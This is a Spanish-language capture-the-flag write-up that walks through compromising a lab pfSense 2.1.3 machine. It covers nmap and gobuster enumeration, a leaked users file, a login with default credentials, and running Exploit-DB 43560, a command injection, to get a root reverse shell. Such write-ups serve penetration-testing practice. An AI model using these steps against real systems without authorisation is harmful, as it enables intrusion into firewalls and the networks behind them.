## Escaneo y enumeración

Hago un escaneo de puertos rápido a la IP y tendremos como resultado el puerto 80 y 443 abiertos, correspondientes a http y https respectivamente. 
```bash
sudo nmap -sS -Pn -p- -T4 --min-rate 5000 10.129.24.14
``` 

![](/img/Pasted%20image%2020260424161528.png) 

Después haré un escaneo de versión y con el script http-enum para mostrar algún directorio los cuales investigaremos.
```bash
sudo nmap -sCV -p80,443 --script=http-enum 10.129.24.14
``` 

![](/img/Pasted%20image%2020260424162024.png) 


Al comprobar la página podemos ver que es un login del software Pfesense que principalmente es un firewall open source

![](/img/Pasted%20image%2020260424162328.png) 

Y en el txt previamente enumerado podemos ver que han mitigado 2 vulnerabilidades de 3 

![](/img/Pasted%20image%2020260424162418.png)

Al hacerle fuzzing podemos ver que hay muchos más directorios que pueden ser interesantes, los cuáles vamos a enumerar para ver si tienen algún tipo de fichero importante.

![](/img/Pasted%20image%2020260424162705.png) 

Ahora comprobaré si hay más ficheros y directorios ocultos que nos puedan servir con otra enumeración con un diccionario más grande  y buscando por extensiones encuentro un fichero txt que está fuera de lo común que es system-users.txt que al acceder se puede ver cuales son las posibles credenciales para logearnos.
```bash
gobuster dir --url https://10.129.24.14/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-tls-validation -x php,txt -t 100
```
![](Pasted%20image%2020260424173143.png) 

![](/img/Pasted%20image%2020260424173202.png)

Así que probaré el usuario rohit más la contraseña default de la aplicación Pfsense que suele ser el mismo nombre "pfsense". Y habremos accedido con las credenciales dentro del panel de control.

![](/img/Pasted%20image%2020260424173406.png) 

Podemos observar que es la versión 2.1.3 la cuál buscando encontré este script https://www.exploit-db.com/exploits/43560 que indica que en el fichero 'status_rrd_graph_img.php' hay Command Injection el cuál en un principio no me funciono, así que gracias a la IA pude modificarlo y hacer que funcione correctamente, el cuál añadiré a la carpeta del writeup. Simplemente lo ejecutamos como indica y al poner en escucha por el puerto dado tendremos exitosamente acceso al sistema y desde root consiguiendo las dos flags para concluir con la máquina.

```bash
python3 43560.py --rhost 10.129.24.14 --lhost 10.10.14.180 --lport 4444 --username rohit --password pfsense
```


![](/img/Pasted%20image%2020260424183920.png)

